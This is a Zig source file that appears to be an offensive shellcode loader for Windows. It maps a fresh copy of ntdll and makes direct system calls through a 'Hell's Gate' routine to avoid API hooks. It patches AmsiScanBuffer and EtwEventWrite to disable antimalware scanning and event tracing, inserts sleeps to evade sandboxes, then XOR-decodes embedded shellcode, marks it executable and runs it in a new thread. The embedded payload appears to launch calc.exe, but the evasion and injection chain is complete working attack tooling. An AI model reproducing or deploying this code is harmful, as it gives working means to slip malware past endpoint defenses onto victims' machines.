const std = @import("std");
const win = @import("win32.zig");
const fresh = @import("fresh.zig");
const syscall = @import("syscall.zig");

const wincc: std.builtin.CallingConvention = .{ .x86_64_win = .{} };

var g_sys: syscall.Syscalls = undefined;

extern fn hells_gate(syscall_number: u32, address: usize) void;
extern fn hell_descent(arg1: usize, arg2: usize, arg3: usize, arg4: usize, arg5: usize, arg6: usize, arg7: usize, arg8: usize, arg9: usize, arg10: usize, arg11: usize) callconv(wincc) win.NTSTATUS;

const SHELLCODE_KEY = 0xAB;

const shellcode = init: {
    const raw = [_]u8{
        0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48,
        0x8b, 0x58, 0x60, 0x48, 0x8b, 0x5b, 0x18, 0x48,
        0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b,
        0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49, 0x89, 0xd8,
        0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31,
        0xc9, 0x66, 0x81, 0xc1, 0xff, 0x88, 0x48, 0xc1,
        0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2,
        0x4d, 0x31, 0xd2, 0x44, 0x8b, 0x52, 0x1c, 0x4d,
        0x01, 0xc2, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a,
        0x20, 0x4d, 0x01, 0xc3, 0x4d, 0x31, 0xe4, 0x44,
        0x8b, 0x62, 0x24, 0x4d, 0x01, 0xc4, 0xeb, 0x32,
        0x5b, 0x59, 0x48, 0x31, 0xc0, 0x48, 0x89, 0xe2,
        0x51, 0x48, 0x8b, 0x0c, 0x24, 0x48, 0x31, 0xff,
        0x41, 0x8b, 0x3c, 0x83, 0x4c, 0x01, 0xc7, 0x48,
        0x89, 0xd6, 0xf3, 0xa6, 0x74, 0x05, 0x48, 0xff,
        0xc0, 0xeb, 0xe6, 0x59, 0x66, 0x41, 0x8b, 0x04,
        0x44, 0x41, 0x8b, 0x04, 0x82, 0x4c, 0x01, 0xc0,
        0x53, 0xc3, 0x48, 0x31, 0xc9, 0x80, 0xc1, 0x07,
        0x48, 0xb8, 0x0f, 0xa8, 0x96, 0x91, 0xba, 0x87,
        0x9a, 0x9c, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe8,
        0x08, 0x50, 0x51, 0xe8, 0xb0, 0xff, 0xff, 0xff,
        0x49, 0x89, 0xc6, 0x48, 0x31, 0xc9, 0x48, 0xf7,
        0xe1, 0x50, 0x48, 0xb8, 0x9c, 0x9e, 0x93, 0x9c,
        0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50,
        0x48, 0x89, 0xe1, 0x48, 0xff, 0xc2, 0x48, 0x83,
        0xec, 0x20, 0x41, 0xff, 0xd6, 0xeb, 0xfe,
    };
    var encoded: [raw.len]u8 = undefined;
    for (&raw, 0..) |b, i| encoded[i] = b ^ SHELLCODE_KEY;
    break :init encoded;
};

pub fn main() void {
    const fresh_ntdll = fresh.loadFreshNtdll() orelse return;
    g_sys = syscall.Syscalls.resolve(fresh_ntdll) orelse return;

    patchAmsiScanBuffer();
    patchEtwEventWrite();

    {
        var delay = win.LARGE_INTEGER{ .QuadPart = -500000 };
        _ = ntDelayExecution(false, &delay);
    }

    const current_process: win.HANDLE = win.NtCurrentProcess;
    var base_addr: ?*anyopaque = null;
    var size: win.SIZE_T = 0x1000;

    const status = ntAllocateVirtualMemory(current_process, &base_addr, 0, &size, win.MEM_COMMIT | win.MEM_RESERVE, win.PAGE_READWRITE);
    if (!win.NT_SUCCESS(status)) return;

    const buffer: [*]u8 = @ptrCast(base_addr);
    @memcpy(buffer[0..shellcode.len], &shellcode);
    for (buffer[0..shellcode.len]) |*b| b.* ^= SHELLCODE_KEY;

    {
        var delay = win.LARGE_INTEGER{ .QuadPart = -500000 };
        _ = ntDelayExecution(false, &delay);
    }

    var old_protect: win.ULONG = 0;
    _ = ntProtectVirtualMemory(current_process, &base_addr, &size, win.PAGE_EXECUTE_READ, &old_protect);

    var thread_handle: win.HANDLE = undefined;
    _ = ntCreateThreadEx(&thread_handle, win.THREAD_ALL_ACCESS, null, current_process, @ptrFromInt(@intFromPtr(base_addr)), null, 0, 0, 0, 0, null);

    _ = ntWaitForSingleObject(thread_handle, false, null);
}

fn ntDelayExecution(alertable: bool, interval: *const win.LARGE_INTEGER) win.NTSTATUS {
    const entry = g_sys.NtDelayExecution;
    hells_gate(entry.number, @intFromPtr(entry.gadget));
    return hell_descent(
        @intFromBool(alertable), @intFromPtr(interval),
        0, 0, 0, 0, 0, 0, 0, 0, 0,
    );
}

fn ntAllocateVirtualMemory(process: win.HANDLE, base: *?*anyopaque, zero: win.ULONG_PTR, size: *win.SIZE_T, alloc: win.ULONG, prot: win.ULONG) win.NTSTATUS {
    const entry = g_sys.NtAllocateVirtualMemory;
    hells_gate(entry.number, @intFromPtr(entry.gadget));
    return hell_descent(
        @intFromPtr(process), @intFromPtr(base), zero, @intFromPtr(size),
        alloc, prot, 0, 0, 0, 0, 0,
    );
}

fn ntProtectVirtualMemory(process: win.HANDLE, base: *?*anyopaque, size: *win.SIZE_T, new_prot: win.ULONG, old_prot: *win.ULONG) win.NTSTATUS {
    const entry = g_sys.NtProtectVirtualMemory;
    hells_gate(entry.number, @intFromPtr(entry.gadget));
    return hell_descent(
        @intFromPtr(process), @intFromPtr(base), @intFromPtr(size), new_prot,
        @intFromPtr(old_prot), 0, 0, 0, 0, 0, 0,
    );
}

fn ntCreateThreadEx(handle: *win.HANDLE, access: win.ACCESS_MASK, attrs: ?*win.OBJECT_ATTRIBUTES, process: win.HANDLE, start: ?*anyopaque, arg: ?*anyopaque, flags: win.ULONG, zero: win.SIZE_T, stack: win.SIZE_T, max_stack: win.SIZE_T, list: ?*anyopaque) win.NTSTATUS {
    const entry = g_sys.NtCreateThreadEx;
    hells_gate(entry.number, @intFromPtr(entry.gadget));
    return hell_descent(
        @intFromPtr(handle), access, @intFromPtr(attrs), @intFromPtr(process),
        @intFromPtr(start), @intFromPtr(arg), flags, zero, stack, max_stack, @intFromPtr(list),
    );
}

fn ntWaitForSingleObject(handle: win.HANDLE, alertable: bool, timeout: ?*win.LARGE_INTEGER) win.NTSTATUS {
    const entry = g_sys.NtWaitForSingleObject;
    hells_gate(entry.number, @intFromPtr(entry.gadget));
    return hell_descent(
        @intFromPtr(handle), @intFromBool(alertable), @intFromPtr(timeout),
        0, 0, 0, 0, 0, 0, 0, 0,
    );
}

fn patchAmsiScanBuffer() void {
    const amsi_dll = win.kernel32.LoadLibraryA("amsi.dll") orelse return;
    const target = win.kernel32.GetProcAddress(amsi_dll, "AmsiScanBuffer") orelse return;
    var base: ?*anyopaque = @ptrCast(target);
    var size: win.SIZE_T = 3;
    var old: win.ULONG = 0;
    _ = ntProtectVirtualMemory(win.NtCurrentProcess, &base, &size, win.PAGE_EXECUTE_READWRITE, &old);
    const patch: [3]u8 = .{ 0x31, 0xC0, 0xC3 };
    @memcpy(@as([*]u8, @ptrCast(target))[0..patch.len], &patch);
}

fn patchEtwEventWrite() void {
    const ntdll_mod = win.kernel32.GetModuleHandleA("ntdll.dll") orelse return;
    const target = win.kernel32.GetProcAddress(ntdll_mod, "EtwEventWrite") orelse return;
    var base: ?*anyopaque = @ptrCast(target);
    var size: win.SIZE_T = 1;
    var old: win.ULONG = 0;
    _ = ntProtectVirtualMemory(win.NtCurrentProcess, &base, &size, win.PAGE_EXECUTE_READWRITE, &old);
    @as(*volatile u8, @ptrCast(target)).* = 0xC3;
}
